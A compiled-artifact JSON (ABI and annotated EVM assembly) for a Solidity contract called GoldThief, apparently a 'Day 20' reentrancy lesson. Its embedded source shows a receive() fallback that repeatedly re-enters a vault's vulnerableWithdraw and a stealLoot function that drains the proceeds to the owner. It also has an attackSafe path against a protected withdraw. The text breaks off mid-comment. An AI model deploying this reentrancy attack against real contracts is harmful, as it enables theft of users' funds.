{
	"Day 20/GoldThief.sol": {
		"GoldThief": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_vaultAddress",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attackCount",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackSafe",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackVulnerable",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackingSafe",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "stealLoot",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "targetVault",
					"outputs": [
						{
							"internalType": "contract IVault",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"Day 20/GoldThief.sol\":215:1753  contract GoldThief {... */\n  mstore(0x40, 0x80)\n    /* \"Day 20/GoldThief.sol\":364:482  constructor(address _vaultAddress) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"Day 20/GoldThief.sol\":431:444  _vaultAddress */\n  dup1\n    /* \"Day 20/GoldThief.sol\":410:421  targetVault */\n  0x00\n  dup1\n    /* \"Day 20/GoldThief.sol\":410:445  targetVault = IVault(_vaultAddress) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Day 20/GoldThief.sol\":464:474  msg.sender */\n  caller\n    /* \"Day 20/GoldThief.sol\":456:461  owner */\n  0x01\n  0x00\n    /* \"Day 20/GoldThief.sol\":456:474  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"Day 20/GoldThief.sol\":364:482  constructor(address _vaultAddress) {... */\n  pop\n    /* \"Day 20/GoldThief.sol\":215:1753  contract GoldThief {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"Day 20/GoldThief.sol\":215:1753  contract GoldThief {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"Day 20/GoldThief.sol\":215:1753  contract GoldThief {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x67a3fde8\n      gt\n      tag_11\n      jumpi\n      dup1\n      0x67a3fde8\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x71cb791a\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_9\n      jumpi\n      dup1\n      0xcff53a4a\n      eq\n      tag_10\n      jumpi\n      jump(tag_2)\n    tag_11:\n      dup1\n      0x12065fe0\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x1f92db45\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x407c2821\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x494eba64\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"Day 20/GoldThief.sol\":1189:1200  attackCount */\n      0x02\n      0x00\n        /* \"Day 20/GoldThief.sol\":1189:1202  attackCount++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_14\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"Day 20/GoldThief.sol\":1220:1233  attackingSafe */\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"Day 20/GoldThief.sol\":1219:1233  !attackingSafe */\n      iszero\n        /* \"Day 20/GoldThief.sol\":1219:1276  !attackingSafe && address(targetVault).balance >= 1 ether */\n      dup1\n      iszero\n      tag_16\n      jumpi\n      pop\n        /* \"Day 20/GoldThief.sol\":1269:1276  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Day 20/GoldThief.sol\":1245:1256  targetVault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Day 20/GoldThief.sol\":1237:1265  address(targetVault).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"Day 20/GoldThief.sol\":1237:1276  address(targetVault).balance >= 1 ether */\n      lt\n      iszero\n        /* \"Day 20/GoldThief.sol\":1219:1276  !attackingSafe && address(targetVault).balance >= 1 ether */\n    tag_16:\n        /* \"Day 20/GoldThief.sol\":1219:1295  !attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5 */\n      dup1\n      iszero\n      tag_17\n      jumpi\n      pop\n        /* \"Day 20/GoldThief.sol\":1294:1295  5 */\n      0x05\n        /* \"Day 20/GoldThief.sol\":1280:1291  attackCount */\n      sload(0x02)\n        /* \"Day 20/GoldThief.sol\":1280:1295  attackCount < 5 */\n      lt\n        /* \"Day 20/GoldThief.sol\":1219:1295  !attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5 */\n    tag_17:\n        /* \"Day 20/GoldThief.sol\":1215:1356  if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {... */\n      iszero\n      tag_18\n      jumpi\n        /* \"Day 20/GoldThief.sol\":1312:1323  targetVault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Day 20/GoldThief.sol\":1312:1342  targetVault.vulnerableWithdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x710957cc\n        /* \"Day 20/GoldThief.sol\":1312:1344  targetVault.vulnerableWithdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_19\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_19:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_21\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_21:\n      pop\n      pop\n      pop\n      pop\n        /* \"Day 20/GoldThief.sol\":1215:1356  if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {... */\n    tag_18:\n        /* \"Day 20/GoldThief.sol\":1372:1385  attackingSafe */\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"Day 20/GoldThief.sol\":1368:1478  if (attackingSafe) {... */\n      iszero\n      tag_22\n      jumpi\n        /* \"Day 20/GoldThief.sol\":1402:1413  targetVault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Day 20/GoldThief.sol\":1402:1426  targetVault.safeWithdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x7fd42617\n        /* \"Day 20/GoldThief.sol\":1402:1428  targetVault.safeWithdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_23:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_25\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_25:\n      pop\n      pop\n      pop\n      pop\n        /* \"Day 20/GoldThief.sol\":1368:1478  if (attackingSafe) {... */\n    tag_22:\n        /* \"Day 20/GoldThief.sol\":215:1753  contract GoldThief {... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"Day 20/GoldThief.sol\":1649:1750  function getBalance() external view returns (uint256) {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_26\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_26:\n      pop\n      tag_27\n      tag_28\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      tag_29\n      swap2\n      swap1\n      tag_30\n      jump\t// in\n    tag_29:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Day 20/GoldThief.sol\":241:266  IVault public targetVault */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_31\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_31:\n      pop\n      tag_32\n      tag_33\n      jump\t// in\n    tag_32:\n      mload(0x40)\n      tag_34\n      swap2\n      swap1\n      tag_35\n      jump\t// in\n    tag_34:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Day 20/GoldThief.sol\":300:323  uint public attackCount */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_36\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_36:\n      pop\n      tag_37\n      tag_38\n      jump\t// in\n    tag_37:\n      mload(0x40)\n      tag_39\n      swap2\n      swap1\n      tag_30\n      jump\t// in\n    tag_39:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Day 20/GoldThief.sol\":832:1143  function attackSafe() external payable {... */\n    tag_6:\n      tag_40\n      tag_41\n      jump\t// in\n    tag_40:\n      stop\n        /* \"Day 20/GoldThief.sol\":490:824  function attackVulnerable() external payable {... */\n    tag_7:\n      tag_42\n      tag_43\n      jump\t// in\n    tag_42:\n      stop\n        /* \"Day 20/GoldThief.sol\":330:355  bool public attackingSafe */\n    tag_8:\n      callvalue\n      dup1\n      iszero\n      tag_44\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_44:\n      pop\n      tag_45\n      tag_46\n      jump\t// in\n    tag_45:\n      mload(0x40)\n      tag_47\n      swap2\n      swap1\n      tag_48\n      jump\t// in\n    tag_47:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Day 20/GoldThief.sol\":273:293  address public owner */\n    tag_9:\n      callvalue\n      dup1\n      iszero\n      tag_49\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_49:\n      pop\n      tag_50\n      tag_51\n      jump\t// in\n    tag_50:\n      mload(0x40)\n      tag_52\n      swap2\n      swap1\n      tag_53\n      jump\t// in\n    tag_52:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"Day 20/GoldThief.sol\":1493:1641  function stealLoot() external {... */\n    tag_10:\n      callvalue\n      dup1\n      iszero\n      tag_54\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_54:\n      pop\n      tag_55\n      tag_56\n      jump\t// in\n    tag_55:\n      stop\n        /* \"Day 20/GoldThief.sol\":1649:1750  function getBalance() external view returns (uint256) {... */\n    tag_28:\n        /* \"Day 20/GoldThief.sol\":1694:1701  uint256 */\n      0x00\n        /* \"Day 20/GoldThief.sol\":1721:1742  address(this).balance */\n      selfbalance\n        /* \"Day 20/GoldThief.sol\":1714:1742  return address(this).balance */\n      swap1\n      pop\n        /* \"Day 20/GoldThief.sol\":1649:1750  function getBalance() external view returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"Day 20/GoldThief.sol\":241:266  IVault public targetVault */\n    tag_33:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"Day 20/GoldThief.sol\":300:323  uint public attackCount */\n    tag_38:\n      sload(0x02)\n      dup2\n      jump\t// out\n        /* \"Day 20/GoldThief.sol\":832:1143  function attackSafe() external payable {... */\n    tag_41:\n        /* \"Day 20/GoldThief.sol\":904:909  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Day 20/GoldThief.sol\":890:909  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Day 20/GoldThief.sol\":890:900  msg.sender */\n      caller\n        /* \"Day 20/GoldThief.sol\":890:909  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"Day 20/GoldThief.sol\":882:924  require(msg.sender == owner, \"Only owner\") */\n      tag_59\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_60\n      swap1\n      tag_61\n      jump\t// in\n    tag_60:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_59:\n        /* \"Day 20/GoldThief.sol\":956:963  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Day 20/GoldThief.sol\":943:952  msg.value */\n      callvalue\n        /* \"Day 20/GoldThief.sol\":943:963  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"Day 20/GoldThief.sol\":935:987  require(msg.value >= 1 ether, \"Need at least 1 ETH\") */\n      tag_62\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_63\n      swap1\n      tag_64\n      jump\t// in\n    tag_63:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_62:\n        /* \"Day 20/GoldThief.sol\":1016:1020  true */\n      0x01\n        /* \"Day 20/GoldThief.sol\":1000:1013  attackingSafe */\n      0x03\n      0x00\n        /* \"Day 20/GoldThief.sol\":1000:1020  attackingSafe = true */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"Day 20/GoldThief.sol\":1045:1046  0 */\n      0x00\n        /* \"Day 20/GoldThief.sol\":1031:1042  attackCount */\n      0x02\n        /* \"Day 20/GoldThief.sol\":1031:1046  attackCount = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"Day 20/GoldThief.sol\":1059:1070  targetVault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Day 20/GoldThief.sol\":1059:1078  targetVault.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"Day 20/GoldThief.sol\":1086:1095  msg.value */\n      callvalue\n        /* \"Day 20/GoldThief.sol\":1059:1098  targetVault.deposit{value: msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_65\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_65:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_67\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_67:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Day 20/GoldThief.sol\":1109:1120  targetVault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Day 20/GoldThief.sol\":1109:1133  targetVault.safeWithdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x7fd42617\n        /* \"Day 20/GoldThief.sol\":1109:1135  targetVault.safeWithdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_68\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_68:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_70\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_70:\n      pop\n      pop\n      pop\n      pop\n        /* \"Day 20/GoldThief.sol\":832:1143  function attackSafe() external payable {... */\n      jump\t// out\n        /* \"Day 20/GoldThief.sol\":490:824  function attackVulnerable() external payable {... */\n    tag_43:\n        /* \"Day 20/GoldThief.sol\":568:573  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Day 20/GoldThief.sol\":554:573  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Day 20/GoldThief.sol\":554:564  msg.sender */\n      caller\n        /* \"Day 20/GoldThief.sol\":554:573  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"Day 20/GoldThief.sol\":546:588  require(msg.sender == owner, \"Only owner\") */\n      tag_72\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_73\n      swap1\n      tag_61\n      jump\t// in\n    tag_73:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_72:\n        /* \"Day 20/GoldThief.sol\":620:627  1 ether */\n      0x0de0b6b3a7640000\n        /* \"Day 20/GoldThief.sol\":607:616  msg.value */\n      callvalue\n        /* \"Day 20/GoldThief.sol\":607:627  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"Day 20/GoldThief.sol\":599:661  require(msg.value >= 1 ether, \"Need at least 1 ETH to attack\") */\n      tag_74\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_75\n      swap1\n      tag_76\n      jump\t// in\n    tag_75:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_74:\n        /* \"Day 20/GoldThief.sol\":690:695  false */\n      0x00\n        /* \"Day 20/GoldThief.sol\":674:687  attackingSafe */\n      0x03\n      0x00\n        /* \"Day 20/GoldThief.sol\":674:695  attackingSafe = false */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"Day 20/GoldThief.sol\":720:721  0 */\n      0x00\n        /* \"Day 20/GoldThief.sol\":706:717  attackCount */\n      0x02\n        /* \"Day 20/GoldThief.sol\":706:721  attackCount = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"Day 20/GoldThief.sol\":734:745  targetVault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Day 20/GoldThief.sol\":734:753  targetVault.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"Day 20/GoldThief.sol\":761:770  msg.value */\n      callvalue\n        /* \"Day 20/GoldThief.sol\":734:773  targetVault.deposit{value: msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_77\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_77:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_79\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_79:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Day 20/GoldThief.sol\":784:795  targetVault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Day 20/GoldThief.sol\":784:814  targetVault.vulnerableWithdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x710957cc\n        /* \"Day 20/GoldThief.sol\":784:816  targetVault.vulnerableWithdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_80\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_80:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_82\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_82:\n      pop\n      pop\n      pop\n      pop\n        /* \"Day 20/GoldThief.sol\":490:824  function attackVulnerable() external payable {... */\n      jump\t// out\n        /* \"Day 20/GoldThief.sol\":330:355  bool public attackingSafe */\n    tag_46:\n      0x03\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\t// out\n        /* \"Day 20/GoldThief.sol\":273:293  address public owner */\n    tag_51:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"Day 20/GoldThief.sol\":1493:1641  function stealLoot() external {... */\n    tag_56:\n        /* \"Day 20/GoldThief.sol\":1556:1561  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Day 20/GoldThief.sol\":1542:1561  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Day 20/GoldThief.sol\":1542:1552  msg.sender */\n      caller\n        /* \"Day 20/GoldThief.sol\":1542:1561  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"Day 20/GoldThief.sol\":1534:1576  require(msg.sender == owner, \"Only owner\") */\n      tag_84\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_85\n      swap1\n      tag_61\n      jump\t// in\n    tag_85:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_84:\n        /* \"Day 20/GoldThief.sol\":1595:1600  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Day 20/GoldThief.sol\":1587:1610  payable(owner).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"Day 20/GoldThief.sol\":1587:1633  payable(owner).transfer(address(this).balance) */\n      0x08fc\n        /* \"Day 20/GoldThief.sol\":1611:1632  address(this).balance */\n      selfbalance\n        /* \"Day 20/GoldThief.sol\":1587:1633  payable(owner).transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_87\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_87:\n      pop\n        /* \"Day 20/GoldThief.sol\":1493:1641  function stealLoot() external {... */\n      jump\t// out\n        /* \"#utility.yul\":7:187   */\n    tag_88:\n        /* \"#utility.yul\":55:132   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":52:53   */\n      0x00\n        /* \"#utility.yul\":45:133   */\n      mstore\n        /* \"#utility.yul\":152:156   */\n      0x11\n        /* \"#utility.yul\":149:150   */\n      0x04\n        /* \"#utility.yul\":142:157   */\n      mstore\n        /* \"#utility.yul\":176:180   */\n      0x24\n        /* \"#utility.yul\":173:174   */\n      0x00\n        /* \"#utility.yul\":166:181   */\n      revert\n        /* 